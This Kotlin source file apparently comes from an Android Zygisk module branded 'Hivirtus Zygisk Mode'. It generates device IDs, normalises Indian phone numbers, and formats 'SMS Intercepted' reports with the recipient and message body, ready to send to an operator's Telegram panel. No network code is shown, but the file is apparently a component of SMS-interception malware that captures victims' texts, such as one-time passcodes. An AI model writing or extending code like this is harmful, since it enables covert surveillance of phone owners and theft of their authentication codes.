package com.hivirtus.zygiskmode

import java.security.SecureRandom

/** Hivirtus panel / Telegram message format. */
object HivirtusPanelFormat {

    const val BRANDING = "Hivirtus Zygisk Mode By @hivirtus @liqdy 🔥"
    const val HANDLE = "@hivirtus @liqdy"

    private const val DEVICE_ID_LEN = 7
    private val ID_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"
    private val random = SecureRandom()

    /** 7-char ID — hivxxxx format */
    fun generateDeviceId(): String {
        val suffix = (1..4).map { ID_CHARS[random.nextInt(ID_CHARS.length)] }.joinToString("")
        return "hiv$suffix"
    }

    fun isValidDeviceId(id: String): Boolean {
        val trimmed = id.trim().lowercase()
        return trimmed.length in 6..8 &&
            (trimmed.startsWith("hiv") || trimmed.all { it.isLowerCase() || it.isDigit() })
    }

    fun formatDest(dest: String): String {
        val raw = dest.trim()
        if (raw.isBlank()) return raw
        if (raw.startsWith("+")) return raw
        val digits = raw.replace(Regex("[^0-9]"), "")
        return when {
            digits.length == 10 -> "+91$digits"
            digits.length == 12 && digits.startsWith("91") -> "+$digits"
            digits.isNotBlank() -> "+$digits"
            else -> raw
        }
    }

    fun oneTapCopy(dest: String, body: String): String =
        "${formatDest(dest)} | ${body.trim()}"

    fun buildTelegramInterceptMessage(dest: String, body: String): String {
        val to = formatDest(dest)
        val smsBody = body.trim()
        return buildString {
            appendLine("📱 SMS Intercepted")
            appendLine(BRANDING)
            appendLine("-----------------")
            appendLine("To:")
            appendLine(to)
            appendLine()
            appendLine("Message:")
            appendLine(smsBody)
            appendLine()
            appendLine("📋 One-tap copy:")
            append(oneTapCopy(dest, smsBody))
        }
    }
}
